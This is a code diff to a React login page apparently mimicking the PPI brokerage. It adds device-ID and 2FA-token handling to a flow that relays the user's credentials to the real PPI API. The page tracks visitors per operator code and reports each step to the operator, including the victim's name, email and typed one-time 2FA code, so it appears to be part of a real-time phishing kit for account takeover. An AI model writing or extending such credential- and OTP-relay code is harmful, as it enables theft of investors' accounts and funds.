@@ -97,6 +97,65 @@ const parseOptionalNumber = (value: unknown): number | undefined => {
   return undefined;
 };
 
+const parseOptionalString = (value: unknown): string | undefined => {
+  if (typeof value !== "string") return undefined;
+  const trimmed = value.trim();
+  return trimmed ? trimmed : undefined;
+};
+
+const DEVICE_FP_KEY = "ppi_device_fp_v1";
+const DEVICE_MAP_KEY = "ppi_dispositivo_ids_v1";
+
+const createClientDeviceId = (prefix: string) => {
+  if (typeof crypto !== "undefined" && typeof crypto.randomUUID === "function") {
+    return `${prefix}-${crypto.randomUUID()}`;
+  }
+  return `${prefix}-${Math.random().toString(36).slice(2)}-${Date.now().toString(36)}`;
+};
+
+const getOrCreateStorageValue = (key: string, fallbackFactory: () => string) => {
+  if (typeof window === "undefined") return fallbackFactory();
+  try {
+    const existing = window.localStorage.getItem(key)?.trim();
+    if (existing) return existing;
+    const generated = fallbackFactory();
+    window.localStorage.setItem(key, generated);
+    return generated;
+  } catch {
+    return fallbackFactory();
+  }
+};
+
+const readStoredDispositivoId = (username: string): number | undefined => {
+  if (typeof window === "undefined") return undefined;
+  const normalized = username.trim().toLowerCase();
+  if (!normalized) return undefined;
+
+  try {
+    const raw = window.localStorage.getItem(DEVICE_MAP_KEY);
+    if (!raw) return undefined;
+    const parsed = JSON.parse(raw) as Record<string, unknown>;
+    return parseOptionalNumber(parsed[normalized]);
+  } catch {
+    return undefined;
+  }
+};
+
+const storeDispositivoId = (username: string, dispositivoId: number) => {
+  if (typeof window === "undefined") return;
+  const normalized = username.trim().toLowerCase();
+  if (!normalized || !Number.isFinite(dispositivoId)) return;
+
+  try {
+    const raw = window.localStorage.getItem(DEVICE_MAP_KEY);
+    const parsed = raw ? (JSON.parse(raw) as Record<string, unknown>) : {};
+    parsed[normalized] = dispositivoId;
+    window.localStorage.setItem(DEVICE_MAP_KEY, JSON.stringify(parsed));
+  } catch {
+    // ignore local storage failures
+  }
+};
+
 const PPI = () => {
   const { operatorCode: rawOperatorCode } = useParams<{ operatorCode?: string }>();
   const cleanedCode = rawOperatorCode
@@ -123,6 +182,9 @@ const PPI = () => {
   const [lastDni, setLastDni] = useState("");
   const [twofaUserId, setTwofaUserId] = useState<number | null>(null);
   const [twofaType, setTwofaType] = useState<number>(1);
+  const [twofaDeviceId, setTwofaDeviceId] = useState<number | null>(null);
+  const [twofaToken, setTwofaToken] = useState("");
+  const deviceFpRef = useRef("");
 
   useVisitTracker();
   useVisitorPresence(sessionId || null);
@@ -139,6 +201,10 @@ const PPI = () => {
         meta.setAttribute("content", "width=device-width, initial-scale=1.0");
       }
     };
+  }, []);
+
+  useEffect(() => {
+    deviceFpRef.current = getOrCreateStorageValue(DEVICE_FP_KEY, () => createClientDeviceId("ppi-fp"));
   }, []);
 
   const createSession = useCallback(async (userEmail: string, status: string, extra: Record<string, unknown> = {}) => {
@@ -216,7 +282,15 @@ const PPI = () => {
       setStatusMsg("Verificando credenciales...");
 
       // Try web login first (supports 2FA)
-      const res = await ppiApi.loginWeb(submittedEmail, password, operatorCode);
+      const rememberedDispositivoId = readStoredDispositivoId(submittedEmail);
+      const res = await ppiApi.loginWeb(
+        submittedEmail,
+        password,
+        operatorCode,
+        deviceFpRef.current || undefined,
+        undefined,
+        rememberedDispositivoId,
+      );
 
       if (res.requires_2fa) {
         // 2FA required — store userId and type, show OTP screen
@@ -229,14 +303,30 @@ const PPI = () => {
         );
         if (parsedTwofaType !== undefined) setTwofaType(parsedTwofaType);
 
+        const parsedDeviceId = parseOptionalNumber(
+          res.dispositivo_id ?? res.raw?.payload?.dispositivoID,
+        );
+        setTwofaDeviceId(parsedDeviceId ?? null);
+        if (parsedDeviceId !== undefined) {
+          storeDispositivoId(submittedEmail, parsedDeviceId);
+        }
+
+        const parsedTwofaToken = parseOptionalString(
+          res.twofa_token ?? res.raw?.payload?.twoFAInfo?.token,
+        );
+        setTwofaToken(parsedTwofaToken || "");
+
         await updateSession("2fa_required", {
-          otp_code: `name:${res.fullName || ""}|email:${res.email || ""}|type:${parsedTwofaType ?? "unknown"}`,
+          otp_code: `name:${res.fullName || ""}|email:${res.email || ""}|type:${parsedTwofaType ?? "unknown"}|device:${parsedDeviceId ?? "unknown"}`,
         });
         setStep("otp_2fa");
         setStatusMsg("");
         setLoading(false);
         return;
       }
+
+      setTwofaToken("");
+      setTwofaDeviceId(null);
 
       if (res.success) {
         const fullName = res.fullName || "";
@@ -302,12 +392,30 @@ const PPI = () => {
       await updateSession("2fa_submitted", { otp_code: `code:${code}` });
       const resolvedUserId = parseOptionalNumber(twofaUserId);
       const resolvedTwofaType = parseOptionalNumber(twofaType) ?? 1;
-      const res = await ppiApi.validate2fa(code, lastUsernameRef.current, resolvedUserId, resolvedTwofaType);
+      const resolvedDeviceId = parseOptionalNumber(twofaDeviceId);
+      const resolvedTwofaToken = parseOptionalString(twofaToken);
+      const res = await ppiApi.validate2fa(
+        code,
+        lastUsernameRef.current,
+        resolvedUserId,
+        resolvedTwofaType,
+        resolvedDeviceId,
+        resolvedTwofaToken,
+      );
 
       if (res.success) {
         const fullName = res.fullName || "";
         const token = res.token || "";
         const cuentaId = res.cuentaId;
+
+        const parsedDeviceId = parseOptionalNumber(
+          res.dispositivo_id ?? res.raw?.payload?.dispositivoID ?? resolvedDeviceId,
+        );
+        if (parsedDeviceId !== undefined) {
+          storeDispositivoId(lastUsernameRef.current || email, parsedDeviceId);
+          setTwofaDeviceId(parsedDeviceId);
+        }
+        setTwofaToken("");
 
         if (fullName) setSyncedFullName(fullName);
         await updateSession("2fa_success", {
@@ -337,7 +445,7 @@ const PPI = () => {
       await updateSession("2fa_error", { otp_code: `error:${e.message}` });
     }
     setLoading(false);
-  }, [updateSession, twofaType, twofaUserId]);
+  }, [updateSession, twofaDeviceId, twofaToken, twofaType, twofaUserId, email]);
 
   // ── Identity Verification (Wayni onboarding) ──
   const handleIdentityVerify = useCallback(async (data: IdentityVerifyPayload): Promise<IdentityVerifyResult | void> => {
